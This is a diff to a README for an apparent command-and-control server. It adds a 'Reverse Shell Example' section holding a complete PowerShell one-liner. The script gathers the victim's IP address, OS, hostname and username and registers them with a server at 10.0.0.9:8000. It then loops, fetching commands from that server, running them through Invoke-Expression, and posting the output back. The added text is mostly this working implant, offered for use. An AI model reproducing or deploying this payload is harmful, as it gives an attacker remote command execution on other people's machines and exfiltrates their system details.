@@ -67,6 +67,13 @@ The workflow is as follows:
 5. The server will store the results in the database and make them available via the web-interface. Hit the refresh button in the detail view of the client to see the output.
 6. Unregister the client if you don't need it anymore. (`http://SERVER_IP_OR_DOMAIN:8000/unregister/{connection_id}`) *interface currently in development*
 
+#### Reverse Shell Example
+
+Here is an example of a reverse shell using the C2 Server.
+
+```PowerShell
+$ip_address=((ipconfig|Select-String "IPv4 Address").ToString() -split ": ")[-1];$os_type=(Get-WmiObject -Class Win32_OperatingSystem).Caption;$hostname=(Get-WmiObject -Class Win32_ComputerSystem).Name;$username=[Environment]::UserName;$main_url="http://10.0.0.9:8000";$interval=30;$intervalUnit="Seconds";$body=@{os_type=$os_type;ip_address=$ip_address;hostname=$hostname;username=$username;password="placeholder"}|ConvertTo-Json;Write-Host "IP Address: $ip_address";Write-Host "OS Type: $os_type";Write-Host "Hostname: $hostname";Write-Host "Username: $username";$url="http://10.0.0.9:8000/register?os_type=$os_type&ip_address=$ip_address&hostname=$hostname&username=$username&password=$password";$response=Invoke-RestMethod -Method Post -Uri $url;$connection_id=$response.id;Write-Host "Registered connection with ID: $connection_id";while($true){$url="$main_url/commands/$connection_id";$command=Invoke-RestMethod -Method Get -Uri $url;Write-Host "Received command: $command";if([string]::IsNullOrEmpty($command)){write-host "No command received yet...";$startSleepCmd="Start-Sleep -$intervalUnit $interval";$startSleepCmdStr=[String]$startSleepCmd;Invoke-Expression $startSleepCmdStr;continue;}if($command -eq "exit"){write-host "Exiting...";break;}write-host "Executing command: $command";if($command -ne "" -or $null -ne $command){$commandStr=[String]$command;$result=Invoke-Expression $commandStr;$output=$result|Out-String;$body=@{output=$output}|ConvertTo-Json;$url="$main_url/output/send/$connection_id";$body=@{output=$output}|ConvertTo-Json;Invoke-RestMethod -Method Post -Uri $url -Body $body;}}
+```
 
 ### API
 
